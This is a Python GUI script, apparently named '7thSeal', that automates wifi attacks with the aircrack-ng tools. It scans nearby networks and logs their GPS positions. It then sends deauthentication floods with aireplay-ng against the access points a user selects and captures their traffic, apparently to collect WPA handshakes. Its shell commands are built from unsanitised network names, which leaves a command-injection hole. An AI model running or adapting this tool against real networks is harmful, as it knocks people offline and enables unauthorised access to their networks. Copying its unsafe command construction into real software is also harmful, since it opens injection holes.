#!/usr/bin/python3
import tkinter as tk
import os
import sys
import time
from time import gmtime, strftime
Interface = os.popen('ip a|grep w |awk -F : \'{print $2}\'|head -1').read()
BSSIDS=[]
mission =""
interswitch=""
def Logit(nm):
	logname = strftime("%a,%d-%b-%Y_%H:%M",gmtime())
	logged = (logname + nm)
	os.system('mkdir /etc/7thseal/logs/' + nm)
	os.system('mv /etc/7thseal/breacher-01.csv  /etc/7thseal/logs/'+nm+'/'+logged+'.csv')
	os.system('mv /etc/7thseal/breacher-01.gps  /etc/7thseal/logs/'+nm+'/'+logged+'.gps')
def Scan():
	os.system('rm /etc/7thseal/breacher-01.csv 2> /dev/null')
	os.system('rm /etc/7thseal/breacher-01.gps 2> /dev/null')
	os.system('mkdir /etc/7thseal 2> /dev/null')
	os.system('mkdir /etc/7thseal/logs 2> /dev/null')
	global BSSIDS
	global Interface
	Interface = str(Interface)
	os.system('airmon-ng start' + Interface + ' 1> /dev/null')
	Interface = os.popen('ip a|grep w |awk -F : \'{print $2}\'|head -1').read()
	os.system('xterm -title \"7thsealSCAN\" -e airodump-ng --gpsd --band abg -w /etc/7thseal/breacher --output-format csv '+ Interface)
	time.sleep(5)
	breacher = open("/etc/7thseal/breacher-01.csv","r")
	uniq=[]
	for i in breacher:
		i = i.split(", ")
		if len(i) < 3:
			continue
		else:
			z = str(i[0]) + "--->" + str(i[len(i)-2] + "--->"+ str(i[3]))
			x = str(i[0])
			if x not in uniq:
				uniq.append(x)
				BSSIDS.append(z)
			elif x == "\n":
				break
	breacher.close
	BSSIDS.pop(-(len(BSSIDS)-1))
	Results()
def Menu():
	global Interface
	global mission
	global interswitch
	seal = tk.Tk()
	seal.title("7thSeal")
	x = 0
	face = tk.Listbox(seal,width=20,height=5,selectmode="single")
	Interface = Interface.split()
	for i in Interface:
		face.insert(tk.END,i)
	def setINT():
		global Interface
		for i in face.curselection():
			Interface = face.get(i)
	face.grid(row =1, column=1)
	setinterface = tk.Button(seal,text="Set the interface",command=setINT)
	setinterface.grid(row=1,column=2)
	WifiScan = tk.Button(seal,text="Scan",width=25,height=5,bg="black",fg="white",command=Scan)
	WifiScan.grid(row=3,column=3)
	missionnme = tk.Entry(seal)
	missionnme.grid(row=2,column=2)
	def getmis():
		global mission
		mission = missionnme.get()
	mis = tk.Button(seal,text="Submit Mission Name",command=getmis)
	mis.grid(row=2,column=3)
	seal.mainloop()
def Results():
	global BSSIDS
	popout = tk.Tk()
	popout.title("7thSeal")
	Res = tk.Listbox(popout,width=60,height=50,selectmode="multiple")
	for i in BSSIDS:
		Res.insert(tk.END, i)
	def Attack():
		global Interface
		global mission
		for i in Res.curselection():
			z=Res.get(i)
			z = z.split("--->")
			target=str(z[0])
			essid=str(z[1])
			ch=str(z[2])
			os.system('(xterm -title \"AllHearing\" -e airodump-ng -c '+ch+' --bssid '+ target +' -w /etc/7thseal/'+essid+' --output-format pcap '+ Interface+')&' )
			time.sleep(10)
			os.system('aireplay-ng -0 30 -a '+target+' '+ Interface)
			time.sleep(15)
			os.system('ps -elf|grep xterm|awk \'{print $4}\'|xargs kill')
			Logit(mission)
			os.system('mv /etc/7thseal/'+essid+'-01.cap /etc/7thseal/logs/'+mission+'/')
			
	attack = tk.Button(popout,text="Attack Selected",command=Attack)
	attack.grid(row=4,column=4)
	Res.grid(row=0,column=0)
	popout.mainloop()
def main():
	global mission
	Menu()
	Logit(mission)
	os.system('airmon-ng stop '+ Interface + ' 1> /dev/null')
if __name__ == '__main__':
    main()

